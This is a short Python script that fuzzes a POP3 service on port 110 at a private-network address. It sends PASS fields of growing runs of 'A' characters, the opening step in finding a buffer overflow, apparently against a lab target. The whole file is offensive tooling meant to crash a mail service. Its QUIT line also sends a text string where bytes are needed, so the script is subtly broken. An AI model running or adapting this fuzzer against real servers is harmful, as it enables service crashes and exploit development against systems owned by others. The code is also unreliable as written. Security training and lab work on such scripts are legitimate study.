import socket

TARGET_IP                    =    "192.168.31.200"


buffer = ["A"]
counter = 100

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter = counter + 200
    
for string in buffer:
        print("FUZZING PASS with " + str(len(string)) + "bytes")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((TARGET_IP, 110))
        s.recv(1024)
        s.send("USER test \r\n".encode("ISO-8859-1"))
        s.recv(1024)    
        s.send(("PASS " + string + "\r\n").encode("ISO-8859-1"))
        s.send("QUIT\r\n")
        s.close()
